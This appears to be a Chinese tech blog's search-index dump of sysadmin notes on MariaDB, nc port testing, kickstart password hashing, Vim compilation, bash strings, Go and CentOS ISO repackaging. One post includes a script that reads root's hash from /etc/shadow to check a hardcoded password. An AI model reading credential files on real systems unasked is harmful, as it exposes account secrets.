mariadbsystemctl enable mariadb 登录 123mysql -u root -p第一次登陆不需要输入密码，直接点enter进入就行 列出所有表 1show tables; 列出所有数据库 1show databases; 查看用户信息 1select user,host from mysql.user; 12345678910111213MariaDB [(none)]&gt; select user,host from mysql.user;+------+------------------------------------+| user | host |+------+------------------------------------+| root | 127.0.0.1 || root | ::1 || | cac8821bbb6ae2bd3553cc0552e923ddxx || root | cac8821bbb6ae2bd3553cc0552e923ddxx || Fish | host || | localhost || root | localhost |+------+------------------------------------+ 删除用户 注：在MySQL中，用户帐户由用户名和主机名部分组成，jabba@localhost 和 &#x6a;&#x61;&#98;&#98;&#97;&#x40;&#49;&#48;&#x2e;&#x31;&#48;&#x2e;&#56;&#x2e;&#56; 是不同的用户帐户。 1drop user Fish@host; 123MariaDB [(none)]&gt; drop user Fish@host;Query OK, 0 rows affected (0.00 sec) 创建用户 1create user &#x27;Fish&#x27;@&#x27;localhost&#x27; identified by &#x27;Fish@#666&#x27;; 创建数据库 1create database jojo; 选择数据库 1use jojo;","categories":[{"name":"服务器","slug":"服务器","permalink":"http://example.com/categories/%E6%9C%8D%E5%8A%A1%E5%99%A8/"}],"tags":[{"name":"数据库","slug":"数据库","permalink":"http://example.com/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"}]},{"title":"dell服务器开机无法正常启动","slug":"服务器问题","date":"2022-06-20T16:00:00.000Z","updated":"2022-06-21T06:39:28.000Z","comments":true,"path":"2022/06/21/服务器问题/","permalink":"http://example.com/2022/06/21/%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%97%AE%E9%A2%98/","excerpt":"","text":"dell服务器开机无法正常启动Strike the F1 key to continue, F2 to run the system setup program","categories":[{"name":"服务器","slug":"服务器","permalink":"http://example.com/categories/%E6%9C%8D%E5%8A%A1%E5%99%A8/"}],"tags":[{"name":"服务器","slug":"服务器","permalink":"http://example.com/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8/"}]},{"title":"go使用rsa加密","slug":"go使用rsa加密","date":"2022-06-09T16:00:00.000Z","updated":"2022-06-10T10:00:34.000Z","comments":true,"path":"2022/06/10/go使用rsa加密/","permalink":"http://example.com/2022/06/10/go%E4%BD%BF%E7%94%A8rsa%E5%8A%A0%E5%AF%86/","excerpt":"","text":"用 Golang 实现 RSA 加密和签名（有示例） go语言RSA API使用示例","categories":[{"name":"go语言","slug":"go语言","permalink":"http://example.com/categories/go%E8%AF%AD%E8%A8%80/"}],"tags":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://example.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"go","slug":"go","permalink":"http://example.com/tags/go/"}]},{"title":"iperf3使用方法详解","slug":"iperf3使用方法详解","date":"2022-06-09T16:00:00.000Z","updated":"2022-06-10T10:08:54.000Z","comments":true,"path":"2022/06/10/iperf3使用方法详解/","permalink":"http://example.com/2022/06/10/iperf3%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%E8%AF%A6%E8%A7%A3/","excerpt":"","text":"iperf3使用方法详解","categories":[{"name":"linux网络","slug":"linux网络","permalink":"http://example.com/categories/linux%E7%BD%91%E7%BB%9C/"}],"tags":[{"name":"iper3","slug":"iper3","permalink":"http://example.com/tags/iper3/"},{"name":"测速","slug":"测速","permalink":"http://example.com/tags/%E6%B5%8B%E9%80%9F/"}]},{"title":"如何测试端口通不通","slug":"如何测试端口通不通","date":"2022-06-09T16:00:00.000Z","updated":"2022-07-06T04:25:34.000Z","comments":true,"path":"2022/06/10/如何测试端口通不通/","permalink":"http://example.com/2022/06/10/%E5%A6%82%E4%BD%95%E6%B5%8B%E8%AF%95%E7%AB%AF%E5%8F%A3%E9%80%9A%E4%B8%8D%E9%80%9A/","excerpt":"","text":"查看某一端口是否开放 lsof 你可以使用 lsof 命令来查看某一端口是否开放。查看端口可以这样来使用，我就以80端口为例： lsof -i:80 如果有显示说明已经开放了，如果没有显示说明没有开放 netstat netstat -aptn执行看看，是否监听在0.0.0.0:3306 netstat -nupl (UDP类型的端口)netstat -ntpl (TCP类型的端口) telnet telnet ip 端口号 方式测试远程主机端口是否打开 如何测试端口通不通(四种方法） Centos查看端口占用情况和开启端口命令 nc 测试端口yum -y install nc TCP端口测试1234567在192.168.130.1上执行：nc -l 8888然后输入内容，并回车；在192.168.130.2上执行：nc 192.168.130.1 8888并观察是否有内容输出，如果有，说明端口是通的。 UDP端口测试123456在192.168.130.1上执行：nc -ul 8888 #监听8888端口在192.168.130.2上执行：nc -u 192.168.130.1 8888然后输入内容，并回车，并观察130.1上是否有内容输出，如果有，说明端口是通的。 参考：利用nc测试服务器之间端口之间的连通性","categories":[{"name":"linux网络","slug":"linux网络","permalink":"http://example.com/categories/linux%E7%BD%91%E7%BB%9C/"}],"tags":[{"name":"端口","slug":"端口","permalink":"http://example.com/tags/%E7%AB%AF%E5%8F%A3/"}]},{"title":"iperf3使用方法详解","slug":"校验密码linux","date":"2022-06-09T16:00:00.000Z","updated":"2022-06-15T09:26:50.000Z","comments":true,"path":"2022/06/10/校验密码linux/","permalink":"http://example.com/2022/06/10/%E6%A0%A1%E9%AA%8C%E5%AF%86%E7%A0%81linux/","excerpt":"","text":"rootpw密码生成方法linux kickstart文件里rootpw密码可以使用明文，也可以使用加密过的值，这里主要介绍下三种加密方法：md5、sha256、sha512 使用明文的方法1rootpw &quot;password&quot; 使用加密的方法12rootpw --iscrypted password_hashauthconfig --enableshadow --enablemd5 (--passalgo=sha256 or --passalgo=sha512) 加密生成方法，这里统一用password来加密1、md5加密123使用openssl passwd命令：# openssl passwd -1 &quot;password&quot;$1$uMOl6YMI$7AAO8YG7l37ipRXCmmame. 12345使用grub-crypt命令，会提示输出密码：# grub-crypt --md5Password:Retype password:$1$Y9TR8PpY$qm1VzsjKzbXtYInyAQLG70 1234使用python，同样也会提示输出密码：# echo &#x27;import crypt,getpass; print crypt.crypt(getpass.getpass(), &quot;$1$8_CHARACTER_SALT_HERE&quot;)&#x27; | python -Password:$1$8_CHARAC$GVWpvO3Hu009C37IYF41L0 2、sha256加密123456使用grub-crypt命令，会提示输出密码：# grub-crypt --sha-256Password:Retype password:$5$NSEqzlxQFNE998rG$gDTEQsndo1pQ9/2.bj1knNNqQ0tQgzKH4bdzEjinHKC 1234使用python，提示输入密码：# echo &#x27;import crypt,getpass; print crypt.crypt(getpass.getpass(), &quot;$5$16_CHARACTER_SALT_HERE&quot;)&#x27; | python -$5$16_CHARACTER_SAL$sc08xCjatZRZPSxgCvHe2.RN7ocYGCrJZo6JzcOMtk5 3、sha512加密123456使用grub-crypt命令，会提示输出密码：# grub-crypt --sha-512Password:Retype password:$6$twuCoL0kTI5ScTbr$GyUJymp1wU0ouFQFiWXoOfl2i.2G5E5wh3tqdprny4avv9kJWc3MdLR/GB9YbfKB1Kx9no9wpO8YcX4d28Mrz. 1234使用python，提示输入密码：# echo &#x27;import crypt,getpass; print crypt.crypt(getpass.getpass(), &quot;$6$16_CHARACTER_SALT_HERE&quot;)&#x27; | python -$6$16_CHARACTER_SAL$ykxE75iUZiphsLz40.oQAi7QIM4meq41EYYvQ66JkbODcvIrGIeRxF7dzpfvnk20ztzE3GY359DSSNQuPQdun. rootpw密码生成方法 校验方法123456789correct=$(&lt;/etc/shadow awk -v user=root -F : &#x27;user == $1 &#123;print $2&#125;&#x27;)prefix=$&#123;correct%&quot;$&#123;correct#\\$*\\$*\\$&#125;&quot;&#125;youEncryptedPwd=$(echo &quot;ty123@#,.STD&quot; |perl -e &#x27;$_ = &lt;STDIN&gt;; chomp; print crypt($_, $ARGV[0])&#x27; &quot;$prefix&quot;)correct: 系统正确的加密密码youEncryptedPwd： 用来测试的密码的加密密码","categories":[{"name":"linux网络","slug":"linux网络","permalink":"http://example.com/categories/linux%E7%BD%91%E7%BB%9C/"}],"tags":[{"name":"iper3","slug":"iper3","permalink":"http://example.com/tags/iper3/"},{"name":"测速","slug":"测速","permalink":"http://example.com/tags/%E6%B5%8B%E9%80%9F/"}]},{"title":"vim82编译安装","slug":"vim82编译安装","date":"2022-04-20T16:00:00.000Z","updated":"2022-04-26T08:17:02.000Z","comments":true,"path":"2022/04/21/vim82编译安装/","permalink":"http://example.com/2022/04/21/vim82%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85/","excerpt":"","text":"安装必要的库1yum install gcc make ncurses ncurses-devel -y 安装常用编程语言的库1yum install ctags git tcl-devel ruby ruby-devel lua lua-devel luajit luajit-devel python python-devel perl perl-devel perl-ExtUtils-ParseXS perl-ExtUtils-XSpp perl-ExtUtils-CBuilder perl-ExtUtils-Embed -y 删除现有的 Vim 安装123yum list installed | grep -i vimsudo yum remove vim-enhanced vim-common vim-filesystem 删除vim配置文件1rm -f /etc/vimrc 下载最新的源码123sudo git clone https://github.com/vim/vim.git或者自己去网站上下载一个8.2版本的vim包，解压进入其中 修改vim的文件12345cd vimecho &#x27;#define SYS_VIMRC_FILE &quot;/etc/vimrc&quot;&#x27; &gt;&gt; src/feature.hecho &#x27;#define SYS_GVIMRC_FILE &quot;/etc/gvimrc&quot;&#x27; &gt;&gt; src/feature.h 这两个参数是修改这个的 123456789vim --version*** system vimrc file: &quot;/etc/vimrc&quot; user vimrc file: &quot;$HOME/.vimrc&quot; 2nd user vimrc file: &quot;~/.vim/vimrc&quot; user exrc file: &quot;$HOME/.exrc&quot; defaults file: &quot;$VIMRUNTIME/defaults.vim&quot; fall-back for $VIM: &quot;/usr/local/share/vim&quot;&quot; 配置 Vim12./configure --with-features=huge --enable-multibyte --enable-python3interp --enable-rubyinterp --enable-perlinterp --enable-luainterp --enable-gui=gtk3 --enable-cscope --with-tlib=ncursesw --prefix=/usr 列举一些 .&#x2F;configure 后面的配置选项 需要啥自己添加 123456789101112--with-features=huge：支持最大特性--enable-multibyte：打开多字节支持，可以在Vim中输入中文--enable-rubyinterp：打开对ruby编写的插件的支持--enable-pythoninterp：打开对python编写的插件的支持--with-python-config-dir=/usr/lib64/python2.7/config 指定python路径(此处是腾讯云CentOS7.4的python2路径)--enable-python3interp：打开对python3编写的插件的支持--with-python-config-dir=/usr/local/python3.7/lib/python3.7/config-3.7m-x86_64-linux-gnu 指定python3路径(此处是我指定位置安装python3后的路径，CentOS编译安装python3.7.0)--enable-perlinterp：打开对perl编写的插件的支持--enable-luainterp：打开对lua编写的插件的支持--enable-gui=gtk2：gtk2支持,也可以使用gnome，表示生成gvim--enable-cscope：打开对cscope的支持--prefix=/usr/local/vim：指定将要安装到的路径(自行创建) 编译vim1make 安装vim1sudo make install 查看vim版本123456789101112131415161718192021222324252627282930313233343536373839404142434445464748vim -versionVIM - Vi IMproved 8.2 (2019 Dec 12, compiled Apr 21 2022 16:07:27)Included patches: 1-4801Compiled by root@FishHuge version without GUI. Features included (+) or not (-):+acl +file_in_path +mouse_urxvt -tag_any_white+arabic +find_in_path +mouse_xterm -tcl+autocmd +float +multi_byte +termguicolors+autochdir +folding +multi_lang +terminal-autoservername -footer -mzscheme +terminfo-balloon_eval +fork() +netbeans_intg +termresponse+balloon_eval_term +gettext +num64 +textobjects-browse -hangul_input +packages +textprop++builtin_terms +iconv +path_extra +timers+byte_offset +insert_expand +perl +title+channel +ipv6 +persistent_undo -toolbar+cindent +job +popupwin +user_commands-clientserver +jumplist +postscript +vartabs-clipboard +keymap +printer +vertsplit+cmdline_compl +lambda +profile +vim9script+cmdline_hist +langmap -python +viminfo+cmdline_info +libcall +python3 +virtualedit+comments +linebreak +quickfix +visual+conceal +lispindent +reltime +visualextra+cryptv +listcmds +rightleft +vreplace+cscope +localmap +ruby +wildignore+cursorbind +lua +scrollbind +wildmenu+cursorshape +menu +signs +windows+dialog_con +mksession +smartindent +writebackup+diff +modify_fname -sodium -X11+digraphs +mouse -sound -xfontset-dnd -mouseshape +spell -xim-ebcdic +mouse_dec +startuptime -xpm+emacs_tags -mouse_gpm +statusline -xsmp+eval -mouse_jsbterm -sun_workshop -xterm_clipboard+ex_extra +mouse_netterm +syntax -xterm_save+extra_search +mouse_sgr +tag_binary -farsi -mouse_sysmouse -tag_old_static system vimrc file: &quot;/etc/vimrc&quot; user vimrc file: &quot;$HOME/.vimrc&quot; 2nd user vimrc file: &quot;~/.vim/vimrc&quot; user exrc file: &quot;$HOME/.exrc&quot; defaults file: &quot;$VIMRUNTIME/defaults.vim&quot; fall-back for $VIM: &quot;/usr/local/share/vim&quot;Compilation: gcc -std=gnu99 -c -I. -Iproto -DHAVE_CONFIG_H -g -O2 -D_REENTRANT -U_FORTIFY_SOURCE -D_FORTIFY_SOURCE=1 Linking: gcc -std=gnu99 -L. -Wl,-z,relro -fstack-protector -rdynamic -Wl,-export-dynamic -Wl,--enable-new-dtags -Wl,-rpath,/usr/lib64/perl5/CORE -L/usr/local/lib -Wl,--as-needed -o vim -lm -ltinfo -ldl -L/usr/lib -llua -Wl,--enable-new-dtags -Wl,-rpath,/usr/lib64/perl5/CORE -fstack-protector -L/usr/lib64/perl5/CORE -lperl -lresolv -lnsl -ldl -lm -lcrypt -lutil -lpthread -lc -L/usr/lib64/python3.6/config-3.6m-x86_64-linux-gnu -lpython3.6m -lpthread -ldl -lutil -lm -lruby -lpthread -lrt -ldl -lcrypt -lm -L/usr/lib64 配置帮助1./configure --help | grep python 恢复配置把配置文件复制到原位置即可 如何在 CentOS 7 上安装 Vim 8.2 Vim-8.2.4567 Vim 8 支持 Python 3 的一些坑","categories":[{"name":"文本","slug":"文本","permalink":"http://example.com/categories/%E6%96%87%E6%9C%AC/"}],"tags":[{"name":"vim","slug":"vim","permalink":"http://example.com/tags/vim/"}]},{"title":"vim配置","slug":"vim配置","date":"2022-04-19T16:00:00.000Z","updated":"2022-04-26T08:26:26.000Z","comments":true,"path":"2022/04/20/vim配置/","permalink":"http://example.com/2022/04/20/vim%E9%85%8D%E7%BD%AE/","excerpt":"","text":"插件管理器 Vim-plug安装方法：12curl -fLo ~/.vim/autoload/plug.vim --create-dirs \\ https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim 插件配置1234567vimrccall plug#begin(&#x27;~/.vim/plugged&#x27;)Plug &#x27;junegunn/vim-easy-align&#x27;call plug#end() 插件的主要形式1234567891011针对 github 的快捷书写：Plug &#x27;junegunn/vim-easy-align&#x27; 会下载 https://github.com/junegunn/vim-easy-align任意 URL: Plug &#x27;https://github.com/junegunn/vim-github-dashboard.git&#x27;按需要加载（相应命令运行时才加载）：Plug &#x27;scrooloose/nerdtree&#x27;, &#123; &#x27;on&#x27;: &#x27;NERDTreeToggle&#x27; &#125;按文件类型加载：Plug &#x27;tpope/vim-fireplace&#x27;, &#123; &#x27;for&#x27;: &#x27;clojure&#x27; &#125;指定版本：Plug &#x27;fatih/vim-go&#x27;, &#123; &#x27;tag&#x27;: &#x27;*&#x27; &#125;手动管理和更新的插件：Plug &#x27;~/my-prototype-plugin&#x27; 安装插件1:PlugInstall 插件状态1:PlugStatus 更新插件1234567使用以下命令，可以更新vim-plug插件自身：:PlugUpgrade使用以下命令，可以批量更新所有已安装的插件：:PlugUpdate 卸载插件1:PlugClean 参考链接 缓冲区切换缓冲区123456:bnext到下一个缓冲区；:bprevious或:bNext到前一个缓冲区；:blast到最后一个缓冲区；:bfirst到第一个缓冲区。根据默认设置，在切换到另一缓冲区之前，Vim将提示你保存当前缓冲区。你也可以使用:set hidden命令，允许在未保存的情况下切换缓冲区。 删除缓冲区1234:bdelete:bdelete filename，:bdelete 3或:3 bdelete:1,3 bdelete 删除指定范围的缓冲区 参考链接 自动命令 autocmd参考链接 tabline 插件参考链接 添加序号参考链接 airline 插件参考链接 nerdtree 插件参考链接 supertab 插件在vim编辑模式时，输入文件中已经有的字符串的前几个字母，再按Tab键即可补全这个字符串，只能补全文件中已经出现的字符串 参考链接1 参考链接2 各个标签的含义 shift-tab pydiction 插件下载所需文件123456$ wget https://github.com/rkulla/pydiction/archive/master.zip$ unzip master.zip$ mv pydiction-master pydiction$ mkdir -p ~/.vim/tools/pydiction$ cp -r pydiction/after ~/.vim$ cp pydiction/complete-dict ~/.vim/tools/pydiction 文件结构如下1234567$ tree ~/.vim/root/.vim├── after│ └── ftplugin│ └── python_pydiction.vim└── tools └── pydiction vimrc文件配置123$ vim ~/.vimrcfiletype plugin onlet g:pydiction_location = &#x27;~/.vim/tools/pydiction/complete-dict&#x27; 可实现的功能1234567891. 简单python关键词补全2. python函数补全带括号3. python模块补全4. python模块内函数，变量补全5. from module import sub-module补全 参考链接","categories":[{"name":"文本","slug":"文本","permalink":"http://example.com/categories/%E6%96%87%E6%9C%AC/"}],"tags":[{"name":"vim","slug":"vim","permalink":"http://example.com/tags/vim/"}]},{"title":"Linux shell字符串截取、替换、删除以及trim","slug":"shell字符串","date":"2022-04-12T16:00:00.000Z","updated":"2022-04-13T08:04:02.000Z","comments":true,"path":"2022/04/13/shell字符串/","permalink":"http://example.com/2022/04/13/shell%E5%AD%97%E7%AC%A6%E4%B8%B2/","excerpt":"","text":"字符串截取从左向右截取第一个&#x2F;&#x2F;后的字符串123word=abcd-//master-01://httpabecho $&#123;word#*//&#125; # 输出:master-01://httpab 从左向右截取最后一个&#x2F;&#x2F;后的字符串123word=abcd-//master-01://httpabecho $&#123;word##*//&#125; # 输出:httpab 从右向左截取第一个&#x2F;&#x2F;后的字符串123word=abcd-//master-01://httpabecho $&#123;word%//*&#125; # 输出:abcd-//master-01: 从右向左截取最一个&#x2F;&#x2F;后的字符串123word=abcd-//master-01://httpabecho $&#123;word%%//*&#125; # 输出:abcd- 截取位置0后3个字符123word=abcd-//master-01://httpabecho $&#123;word:0:3&#125; # 输出:abc 从位置1截取到末尾123word=abcd-//master-01://httpabecho $&#123;word:1&#125; # 输出:bcd-//master-01://httpab 从位置-1截取到末尾，就是截取最后一个123word=abcd-//master-01://httpabecho $&#123;word:(-1)&#125; # 输出:b 字符串替换1234从左到右，匹配第一个，替换//为cdword=abcd-//master-01://httpabecho $&#123;word/\\/\\//cd&#125; # 输出:abcd-cdmaster-01://httpab 将所有匹配的&#x2F;&#x2F;替换为cd123word=abcd-//master-01://httpabecho $&#123;word//\\/\\//cd&#125; # 输出:abcd-cdmaster-01:cdhttpab 前缀匹配，只匹配从位置0开始的字符123456word=abcd-//master-01://httpabecho $&#123;word/#ab/cd&#125; # -不是前缀，会匹配失败echo $&#123;word/#-/cd&#125;# 输出:abcd-cdmaster-01://httpab# 输出:abcd-//master-01://httpab 后缀匹配，只匹配结尾字符12345678word=abcd-//master-01://httpabecho $&#123;word/%http*/xy&#125; # 输出:abcd-//master-01://xyecho $&#123;word/%ab/xy&#125;# 输出:abcd-//master-01://httpxyecho $&#123;word/%ab*/xy&#125;# 出现*，会从起始匹配# 输出:xy 字符串删除利用字符截取和替换，以及拼接可以实现删除字符的效果 删除前3个字符123word=abcd-//master-01://httpabecho $&#123;word#*$&#123;word:0:3&#125;&#125; # 输出:d-//master-01://httpab 删除后3个字符123word=abcd-//master-01://httpabecho $&#123;word%*$&#123;word:(-3)&#125;&#125; # 输出:abcd-//master-01://htt 删除第一个ab123word=abcd-//master-01://httpabecho $&#123;word/ab/&#125; # 输出:cd-//master-01://httpab 删除所有ab123word=abcd-//master-01://httpabecho $&#123;word//ab/&#125; # 输出:cd-//master-01://http 删除最后一个ab123word=abcd-//master-01://httpabcdecho $&#123;word%ab*&#125;$&#123;word##*ab&#125;# 输出:abcd-//master-01://httpcd 字符串trim12345利用xargs可以实现trimword=&quot; hello wolrd &quot;word=`echo $word | xargs`echo $word# 输出:hello wolrd 参考链接","categories":[{"name":"文本","slug":"文本","permalink":"http://example.com/categories/%E6%96%87%E6%9C%AC/"}],"tags":[{"name":"字符串","slug":"字符串","permalink":"http://example.com/tags/%E5%AD%97%E7%AC%A6%E4%B8%B2/"}]},{"title":"go学习笔记","slug":"go语言笔记","date":"2022-04-10T16:00:00.000Z","updated":"2023-01-09T09:00:10.000Z","comments":true,"path":"2022/04/11/go语言笔记/","permalink":"http://example.com/2022/04/11/go%E8%AF%AD%E8%A8%80%E7%AC%94%E8%AE%B0/","excerpt":"","text":"go:embed 的使用简介 go:embed 是 go 1.16版本添加的新特性，可以在 go 生成的应用程序中嵌入静态文件（文件，文件夹）。部署的时候，直接扔一个二进制文件即可，不用再包含一些静态文件，考虑文件相对位置，因为它们已经被打包到生成的应用程序中了。 导入 embed 的 go 源文件可以使用 &#x2F;&#x2F;go:embed 指令在编译时从包目录或子目录中将读取的内容转换成 string, []byte, 或者 embed.FS 类型的变量。 nil其他语言的null fmt.Printf()和fmt.Println()的区别获取一个变量类型 1fmt.Println(reflect.TypeOf(var)) 12345678fmt.Println(&quot;sss&quot;)fmt.Printf(&quot;2**%d = %d\\n&quot;, index, value)%d就是value，输出时会将value带进去运算fmt.Println(&quot;2**%d = %d\\n&quot;, index, value)就是单纯的输出三个变量，不会带进去运算 参考链接 设置代理go env -w GOPROXY&#x3D;”https://goproxy.io,direct“ go编译报错more than one character in rune literal在go语法中，双引号是常用的来表达字符串，如果你使用了单引号，编译器会提示出错 单引号只能包含一个字符，例如’b’ ,程序会输出98表示字符b的ascii码。 如果非要使用单引号输出必须使用string函数转换 1234fmt.Println(string(&#x27;b&#x27;) )Printf 和 Println 的区别printf 输出后不换行， println输出后自动换行；printf格式化输出，println 直接输出内容 go run: cannot run non-main packageGo的错误信息提示的很直接了当，main方法只能放在package main中，go run 是执行命令，必须要一个main用来调用，install可以直接编译成包文件，也可以编译出exe（如果有main函数的话） too many arguments to return have (error) want ()to没在函数中添加返回值 1234567func XXX() (string, error)&#123; var x string var c error return x, c &#125;加上就行 字典1234var XXX map[string]stringmap[string] 字典key的类型为stringstring 字典value的类型为string 时间戳分别使用 time.Now 的 Unix 和 UnixNano， 来获取从 Unix 纪元起，到现在经过的秒数和纳秒数。 1234567891011121314151617181920package mainimport ( &quot;fmt&quot; &quot;time&quot;)func main() &#123; now := time.Now() secs := now.Unix() nanos := now.UnixNano() fmt.Println(now) millis := nanos / 1000000 fmt.Println(secs) fmt.Println(millis) fmt.Println(nanos) fmt.Println(time.Unix(secs, 0)) fmt.Println(time.Unix(0, nanos))&#125; 1234567$ go run epoch.go 2012-10-31 16:13:58.292387 +0000 UTC1351700038135170003829213517000382923870002012-10-31 16:13:58 +0000 UTC2012-10-31 16:13:58.292387 +0000 UTC Go by Example 中文版: 时间戳 Strconv主要提供字符串和其他类型之间转换的函数。常见的比如将字符串转换成整型， 这个可能在脚本类语言没有影响， 但在强类型语言中极其重要 字符串转整型123s := &quot;2&quot;res, err := strconv.Atoi(s)fmt.Println(reflect.TypeOf(res)) // 这里用 反射 来验证类型有没有转换成功 整型转字符串#123i := 21111res := strconv.Itoa(i) //将十进制数转化成字符串fmt.Println(reflect.TypeOf(res)) Go中的strconv FormatInt系列函数12345t := 12132123132tstring := strconv.FormatInt(t,10)fmt.Printf(&quot;%T&quot;, tstring)string Go语言-命令行参数（os.Args, flag包）os.Args程序获取运行他时给出的参数，可以通过os包来实现。先看代码： 123456789101112131415161718192021package mainimport ( &quot;fmt&quot; &quot;os&quot; &quot;strconv&quot;)func main () &#123; for idx, args := range os.Args &#123; fmt.Println(&quot;参数&quot; + strconv.Itoa(idx) + &quot;:&quot;, args) &#125;&#125;$go run main.go 1 3 -X ?参数0: /tmp/go-build116558042/command-line-arguments/_obj/exe/main参数1: 1参数2: 3参数3: -X参数4: ? 可以看到，命令行参数包括了程序路径本身，以及通常意义上的参数。程序中os.Args的类型是 []string ，也就是字符串切片。所以可以在for循环的range中遍历，还可以用 len(os.Args) 来获取其数量。 如果不想要输出os.Args的第一个值，也就是可执行文件本身的信息，可以修改上述程序： 1for idx, args := range os.Args[1:] &#123; flag包Go语言-命令行参数（os.Args, flag包） 123456789101112131415161718192021222324252627282930313233343536package mainimport ( &quot;fmt&quot; &quot;flag&quot;)var b = flag.Bool(&quot;b&quot;, false, &quot;bool类型参数&quot;)var s = flag.String(&quot;s&quot;, &quot;&quot;, &quot;string类型参数&quot;)func main() &#123; flag.Parse() fmt.Println(&quot;-b:&quot;, *b) fmt.Println(&quot;-s:&quot;, *s) fmt.Println(&quot;其他参数：&quot;, flag.Args())&#125;------------------------------------$ go run main.go-b: false-s: 其他参数： []------------------------------------$ go run main.go -b-b: true-s: 其他参数： []------------------------------------$ go run main.go -b -s test others-b: true-s: test其他参数： [others]------------------------------------$ go run main.go -helpUsage of /tmp/go-build080353851/command-line-arguments/_obj/exe/main: -b bool类型参数 -s string string类型参数exit status 2 flag包相比单纯的通过os.Args切片分析命令行参数，提供了更强的能力。 使用flag包，首先定义待解析命令行参数，也就是以”-“开头的参数，比如这里的 -b -s -help等。-help不需要特别指定，可以自动处理。这里指定了两个参数，-b和-s： 1234567var b = flag.Bool(&quot;b&quot;, false, &quot;bool类型参数&quot;)var s = flag.String(&quot;s&quot;, &quot;&quot;, &quot;string类型参数&quot;)-----------------原型：func Bool(name string, value bool, usage string) *boolfunc String(name string, value string, usage string) *string flag使用前，必须首先解析： 1flag.Parse() const关键字（常量）Go语言中的常量使用关键字 const 定义，用于存储不会改变的数据，常量是在编译时被创建的，即使定义在函数内部也是如此，并且只能是布尔型、数字型（整数型、浮点型和复数）和字符串型。由于编译时的限制，定义常量的表达式必须为能被编译器求值的常量表达式。 123456const name [type] = valueconst ( e = 2.7182818 pi = 3.1415926) Golang io.Copy()用法及代码示例Golang io.Copy()用法及代码示例%E6%88%96%E5%BC%95%E5%8F%91%E9%94%99%E8%AF%AF%E4%B8%BA%E6%AD%A2%E3%80%82) 用法： 1func Copy(dst Writer, src Reader) (written int64, err error) 在此，“dst”是目标，“src”是将内容复制到目标的源。返回值：它返回复制到“dst”的int64类型的字节总数，并且还返回从src复制到dst(如果有)时遇到的第一个错误。如果复制没有错误，则返回“nil”。 go变量大小写1Go语言通过首字母的大小写来控制访问权限。 无论是方法，变量，常量或是自定义的变量类型，如果首字母大写，则可以被外部包访问，反之则不可以。 而结构体中的字段名，如果首字母小写的话，则该字段无法被外部包访问 Go&#x2F;Golang build error: &#x2F;&#x2F;go:build comment without &#x2F;&#x2F; +build commentIf version is lower than 1.17 – need to to update golang on new version for fix it. Go to https://go.dev/doc/install and follow instructions for update. go版本过低导致的，更新版本即可 yum更新go版本 12yum remove goyum install go https://blog.csdn.net/qq_29695701/article/details/82744684 golang 报错illegal rune literalillegal这个单词报错比较常见，【不合法】，golang对引号使用还是很严格的，使用双引号包裹字符串，否则报上面那个错误。 更新依赖包12345go mod 更新单个包的文件go get -u code.aliyun.com/module-go/apiresult更新所有所有文件go get -u 使用go get命令更新go mod文件","categories":[{"name":"go语言","slug":"go语言","permalink":"http://example.com/categories/go%E8%AF%AD%E8%A8%80/"}],"tags":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://example.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"go","slug":"go","permalink":"http://example.com/tags/go/"}]},{"title":"linux（centos）系统封装","slug":"系统封装","date":"2022-03-17T16:00:00.000Z","updated":"2022-04-29T10:49:48.000Z","comments":true,"path":"2022/03/18/系统封装/","permalink":"http://example.com/2022/03/18/%E7%B3%BB%E7%BB%9F%E5%B0%81%E8%A3%85/","excerpt":"","text":"重新封装centos7 说道封装系统要知道两件事 系统安装流程 iso镜像文件内各个文件的作用 系统安装流程用户在安装过程中可以通过按 Ctrl+Alt+F2 键进入 root shell 与之互动。 在isolinux.cfg文件中添加 inst.noshell 可禁止访问 失败镜像的案例先来说说这个【安装流程】，想知道安装流程有个办法，制作一个失败的系统镜像，这个失败的位置也很关键。不能是依赖的问题（依赖出问题了，在安装自检索引文件时就会发现，【依赖的版本不兼容】 这种问题也不行，因为不能【Report Bug】），最好是下图这样的错误，才能进入调试界面 这个是 系统找不到new-kernel-pkg这个文件，估计是内核需要这个文件，但是从squashfs.img（跟目录）里复制到硬盘的分区里时，发现没有这个文件 拆解squashfs.img，发现&#x2F;usr&#x2F;sbin&#x2F;目录的确没有这个文件 下图是内核的依赖 &#x2F;usr&#x2F;sbin&#x2F;new-kernel-pkg这个文件由 grubby 这个包提供 有两种方法可以解决： 安装grubby这个包 直接从另一个系统上把&#x2F;usr&#x2F;sbin&#x2F;new-kernel-pkg拷到 squashfs.img 的对应位置上 我用的是第二种，可以解决这个报错 “———————————————- 进入debug界面点击debug按钮进入debug界面 如下图所示 切换界面：Alt+Tab 系统安装流程： 加载内核————&gt;运行initrd.img（加载PE系统）————&gt;运行某个装机脚本（例如ks.cfg，或者是默认的那个）————&gt; 把 squashfs.img 解包到loop设备，挂载为根目录，chroot到根目录上————&gt; 根据安装脚本，把所需的文件从 根目录 中拷贝到硬盘的分区中（也就是把系统拷贝过去，并不会把 根目录 中所有的文件都拷过去） shell界面 选的是光盘安装，sr0就是iso镜像文件，挂载目录是 &#x2F;run&#x2F;install&#x2F;repo sda是系统盘，已经分区完成了，挂载目录是 12根分区： /mnt/sysimageboot分区： /mnt/sysimage/boot loop设备应该是 squashfs.img 解压的，为根目录 安装程序可能在 initrd.img 也可能在 squashfs.img里（这个猜的） 具体的启动流程见 『linux_iso镜像解析』 了解这些就应该可以了 “————————————————- 自动化安装，ks.cfg（或者是别的什么cfg文件，符合kickstart文件规范就行）就是一个脚本，除了安装系统时本来就有的一些操作之外，自定义了一些操作（复制、粘贴、改权限之类的） repodata里的软件索引文件 *-std.xml 就是rpm包的安装目录 以上就是本人浅显的理解 系统安装的一些具体步骤 下载iso文件（centos7_mini.iso）,挂载该文件，将iso中的所有文件拷贝到目录 &#x2F;centos_std 123mount -o loop centos_mini.iso /mntcp -a /mnt/* /centos_std 删除 &#x2F;centos_std中的所有TRANS.TBL文件，该文件会在封包时自动生成 1rm -rf `find /centos_std -name TRANS.TBL` 